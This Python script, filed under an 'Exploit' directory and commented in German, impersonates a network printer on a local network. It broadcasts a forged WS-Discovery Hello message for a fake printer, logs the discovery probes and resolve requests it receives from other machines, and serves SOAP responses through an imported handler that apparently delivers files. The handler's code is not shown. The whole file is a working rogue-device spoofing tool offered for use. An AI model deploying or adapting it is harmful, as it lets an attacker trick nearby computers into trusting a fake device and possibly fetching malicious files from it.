Exploit/WSD/wsd_named_printer_ready/geruest_debug_corrected.py

import socket
import threading
from http.server import HTTPServer
from SimpleWSDHandler_mit_Dateiauslieferung import SimpleWSDHandler

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return socket.gethostbyname(socket.gethostname())

def send_hello():
    MULTICAST_GRP = "239.255.255.250"
    MULTICAST_PORT = 3702
    hello_message = f"""<?xml version="1.0" encoding="UTF-8"?>
<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery">
  <e:Header>
    <a:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Hello</a:Action>
    <a:MessageID>uuid:hello-msg-001</a:MessageID>
    <a:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</a:To>
  </e:Header>
  <e:Body>
    <d:Hello>
      <a:EndpointReference>
        <a:Address>urn:uuid:fake-printer-uuid-001</a:Address>
      </a:EndpointReference>
      <d:Types>dn:Printer</d:Types>
      <d:Scopes>http://schemas.xmlsoap.org/ws/2006/02/devprof/Printer</d:Scopes>
      <d:XAddrs>http://192.168.2.200:5357/wsd/device</d:XAddrs>
      <d:MetadataVersion>1</d:MetadataVersion>
    </d:Hello>
  </e:Body>
</e:Envelope>
"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(get_local_ip()))
    sock.sendto(hello_message.encode(), (MULTICAST_GRP, MULTICAST_PORT))
    print("[+] Hello-Nachricht gesendet.")

def listen_for_probes():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("", 3702))
    mreq = socket.inet_aton("239.255.255.250") + socket.inet_aton(get_local_ip())
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    print("[*] Warte auf Probe- und Resolve-Nachrichten…")
    while True:
        data, addr = sock.recvfrom(4096)
        decoded = data.decode(errors="ignore")
        print(">>> EMPFANGEN <<<")
        print(decoded)
        if "Probe" in decoded:
            print(f"[+] Probe erkannt von {addr}")
        elif "Resolve" in decoded:
            print(f"[+] Resolve erkannt von {addr}")

def start_http():
    server_address = ('', 5357)
    httpd = HTTPServer(server_address, SimpleWSDHandler)
    print("[*] SOAP-HTTP-Server läuft auf Port 5357.")
    httpd.serve_forever()

if __name__ == "__main__":
    threading.Thread(target=send_hello).start()
    threading.Thread(target=listen_for_probes, daemon=True).start()
    start_http()
